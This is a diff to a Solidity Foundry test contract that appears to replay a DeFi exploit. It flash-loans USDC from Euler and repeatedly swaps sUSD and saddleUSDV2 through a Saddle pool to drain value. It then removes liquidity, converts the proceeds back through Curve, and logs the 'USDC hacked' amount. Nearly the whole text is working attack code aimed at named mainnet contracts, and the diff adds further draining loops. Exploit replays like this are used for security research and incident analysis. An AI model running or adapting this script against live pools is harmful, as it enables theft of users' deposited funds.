@@ -140,6 +140,7 @@ contract ContractTest is Test {
     address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
     address private constant saddleUsdV2 =
         0x5f86558387293b6009d7896A61fcc86C17808D62;
+    ICurve curve_3pool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
     address private constant curvepool =
         0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
     address private constant saddlepool =
@@ -158,49 +159,64 @@ contract ContractTest is Test {
             15_000_000e6,
             new bytes(0)
         );
-        IEuler(eulerLoans).flashLoan(
-            address(this),
-            usdc,
-            15_000_000_000,
-            new bytes(0)
-        );
-
         console.log(
-            "USDC hacked: %sM",
-            IERC20(usdc).balanceOf(address(this)) / 1e6 / 1e6
+            "======================== finsih attack ======================== "
+        );
+        require(IERC20(usdc).balanceOf(address(this)) > 1775 * 1e6);
+        emit log_named_decimal_uint(
+            "USDC hacked: ",
+            IERC20(usdc).balanceOf(address(this)),
+            6
         );
     }
 
     function onFlashLoan(
-        address initiator,
-        address token,
+        address,
+        address,
         uint256 amount,
         uint256 fee,
-        bytes calldata data
+        bytes calldata
     ) external returns (bytes32) {
         IERC20(usdt).approve(curvepool, type(uint256).max);
         IERC20(usdc).approve(curvepool, type(uint256).max);
         IERC20(susd).approve(curvepool, type(uint256).max);
 
         IERC20(dai).approve(curvepool, type(uint256).max);
+        IERC20(dai).approve(address(curve_3pool), type(uint256).max);
+        IERC20(usdt).approve(address(curve_3pool), type(uint256).max);
         IERC20(susd).approve(saddlepool, type(uint256).max);
         IERC20(saddleUsdV2).approve(saddlepool, type(uint256).max);
         attack();
 
         //Repay Loan
         IERC20(usdc).approve(msg.sender, amount + fee);
+
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
     function attack() internal {
         //Swap USDC to SUSD Via Curve
-        console.log("USDC loaned: %s", IERC20(usdc).balanceOf(address(this)));
-        uint256 amount = IERC20(usdc).balanceOf(address(this));
-
-        ICurve(curvepool).exchange(1, 3, amount, 1);
         console.log(
-            "SUSD exchanged: %s",
-            IERC20(susd).balanceOf(address(this))
+            "======================== start attack ========================"
+        );
+        emit log_named_decimal_uint(
+            "USDC loaned: ",
+            IERC20(usdc).balanceOf(address(this)),
+            6
+        );
+
+        uint256 amount = IERC20(usdc).balanceOf(address(this));
+        ICurve(curvepool).exchange(1, 3, amount, 1);
+
+        emit log_named_decimal_uint(
+            "LP token amount",
+            IERC20(saddleUsdV2).balanceOf(address(this)),
+            18
+        );
+        emit log_named_decimal_uint(
+            "SUSD token amount",
+            IERC20(susd).balanceOf(address(this)),
+            18
         );
 
         // Attack
@@ -210,6 +226,7 @@ contract ContractTest is Test {
         swapToSaddle(amount0);
         swapFromSaddle(amount1);
         swapToSaddle(amount0);
+
         swapFromSaddle(9669749439299164955998576);
 
         uint256 amount00 = 5000000000000000000000000;
@@ -220,19 +237,55 @@ contract ContractTest is Test {
         swapToSaddle(10000000000000000000000000);
         swapFromSaddle(4661615013534255756105730);
 
+        for (uint i = 0; i < 2; i++) {
+            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 3);
+            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 3);
+        }
+
+        for (uint i = 0; i < 6; i++) {
+            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 10);
+            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 10);
+        }
+
+        for (uint i = 0; i < 6; i++) {
+            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 30);
+            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 25);
+        }
+
+        for (uint i = 0; i < 12; i++) {
+            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 79);
+            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 60);
+        }
+
+        for (uint i = 0; i < 25; i++) {
+            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 500);
+            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 410);
+        }
+
         IERC20(saddleUsdV2).approve(swap_flashloan, type(uint256).max);
+
         uint256[] memory ount_put = new uint256[](3);
         ount_put[0] = 0;
         ount_put[1] = 0;
         ount_put[2] = 0;
 
         console.log(
-            "lp token bal is ",
-            IERC20(saddleUsdV2).balanceOf(address(this))
+            "======================== finsih circulate swap ======================== "
+        );
+
+        emit log_named_decimal_uint(
+            "LP token amount",
+            IERC20(saddleUsdV2).balanceOf(address(this)),
+            18
+        );
+        emit log_named_decimal_uint(
+            "SUSD token amount",
+            IERC20(susd).balanceOf(address(this)),
+            18
         );
 
         ISwapFlashLoan(swap_flashloan).removeLiquidity(
-            5016537096730963109713838,
+            IERC20(saddleUsdV2).balanceOf(address(this)),
             ount_put,
             block.timestamp
         );
@@ -241,37 +294,22 @@ contract ContractTest is Test {
         amount = IERC20(susd).balanceOf(address(this));
 
         ICurve(curvepool).exchange(3, 1, amount, 1);
-        ICurve(curvepool).exchange(0, 1, 1810723455638732389504479, 1);
-        ICurve(curvepool).exchange(2, 1, 1530488975938, 1);
-        console.log("finish : %s", amount);
 
-        // console.log(
-        //     "USDC exchanged: %s \n",
-        //     IERC20(usdc).balanceOf(address(this))
-        // );
+        curve_3pool.exchange(0, 1, IERC20(dai).balanceOf(address(this)), 1);
+        curve_3pool.exchange(2, 1, IERC20(usdt).balanceOf(address(this)), 1);
     }
 
     function swapToSaddle(uint256 amountStart) internal {
         //Swap SUSD for SaddleUSDV2
-        uint256 amount = amountStart;
 
-        console.log("\n  want to swap susd amount is: %s", amount);
+        uint256 amount = amountStart;
         ISaddle(saddlepool).swap(0, 1, amount, 1, block.timestamp);
-        console.log(
-            "saddleUsdV2 swapped: %s",
-            IERC20(saddleUsdV2).balanceOf(address(this))
-        );
-        console.log("\n");
     }
 
     function swapFromSaddle(uint256 amountStart) internal {
         //Swap SaddleUSDV2 for SUSD
 
-        // uint256 amount = IERC20(saddleUsdV2).balanceOf(address(this));
         uint256 amount = amountStart;
-        console.log("want to swap saddleUsdV2 is : %s", amount);
         ISaddle(saddlepool).swap(1, 0, amount, 1, block.timestamp);
-        console.log("SUSD swapped: %s", IERC20(susd).balanceOf(address(this)));
-        console.log("\n");
     }
 }
